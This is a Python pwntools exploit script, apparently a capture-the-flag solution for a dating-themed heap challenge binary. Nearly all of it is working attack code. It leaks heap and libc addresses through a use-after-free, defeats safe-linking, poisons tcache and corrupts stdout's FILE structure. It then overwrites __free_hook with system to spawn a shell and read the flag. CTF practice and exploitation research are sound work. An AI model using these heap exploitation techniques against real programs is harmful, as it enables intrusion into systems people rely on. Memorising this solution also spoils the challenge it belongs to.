#encoding:utf-8
from pwn import *
import re

ip = '172.17.0.2'
port = 9999 
local = 1
filename = './pwn'
libc_name = 'libc.so.6'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, timeout=3, log_level=1)
	
	if local:
		io = process(filename, env={'LD_PRELOAD':"./libc.so.6"})
		libc_name = './libc.so.6'
	else:
		io = remote(ip, port)
		libc_name = './libc.so.6'

	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def add(content, size = 0x1, nickname=b'callmecro'):
	sla(b'Choice: ', b'3')
	sla(b'Choice: ', b'3')
	if size < len(content):
		size = len(content)
	sla(b'Now, tell me, what do you look for in a partner: ', str(size).encode())
	sla(b'Give your new male friend a nickname: ', nickname)
	if size == len(content):
		sa(b'For both of you, a little greeting: ', content)
	else:
		sla(b'For both of you, a little greeting: ', content)

def delete(idx):
	sla(b'Choice: ', b'4')
	sla(b'Please choose your male friends to visit: ', str(idx).encode())
	sla(b'Choice: ', b'3')

def get_married(idx, content):
	sla(b'Choice: ', b'6')
	sla(b'marry?', str(idx).encode())
	ru(b'commitment to you: ')
	res = rl()
	sla(b"groom: ", content)
	return res

def pwn():
	cc()

	sla(b'Name: ', b'callmecro')
	sla(b'Age: ', b'20')
	sla(b'Sex (1:man,2: woman): ', b'2')

	for i in range(5):
		sla(b'Choice: ', b'3')
		sla(b'Choice: ', b'2')

	for i in range(16):
		sla(b'Choice: ', b'2')
		sla(b'Choice: ', b'3')

	sla(b'Choice: ', b'5')
	sla(b'Choice: ', b'1')
	sla(b'Choice: ', b'5')
	sla(b'Choice: ', b'2')

	add(b'callmecro', 0x80)
	delete(0)

	sla(b'Choice: ', b'6')
	sla(b'marry?', b'0')
	ru(b'commitment to you: ')
	heap_addr = (u64(rl().ljust(0x8, b'\x00')) ^ 0) << 12
	log.success('heap_addr: 0x%x', heap_addr)

	sla(b"groom: ", p64((heap_addr) >> 12).ljust(0x10, b'\x00'))
	sla(b"nickname: ", (b'A'*0x8).ljust(0x10, b'\x00'))
	delete(0)

	sla(b'Choice: ', b'999')
	sla(b'friends: ', b'0')
	sla(b'heart: ', p64(((heap_addr + 0x2a0) >> 12) ^ (heap_addr+0x10)))

	add(b'callmecro', 0x80)
	add(p16(0)*0x27+p16(0x7), 0x80)
	delete(2)

	add((p16(0)*2+p16(1)*2+p16(0)+p16(0)+p16(1)*26), 0x80)
	add(b'\xc0\x86', 0x2)

	add(p64(0xfbad1800) + p64(0) * 3 + b'\x00', 0x90)

	assert (b'\x7f' in r())
	for i in range(3):
		r()

	rr(0x6af)
	libc.address = u64(rr(8)) - 0x1e14c0

	log.success("libc_addr: 0x%x", libc.address)
	add(p64(libc.sym['__free_hook']))
	add(p64(libc.sym['system']), 0x190)
	add(b'/bin/sh\x00')
	delete(8)

	sl('cat /flag')
	log.success("flag: %s", ru(b'}').decode())
	cl()

if __name__ == '__main__':
	while True:
		try:
			pwn()
			break
		except:
			cl()
			continue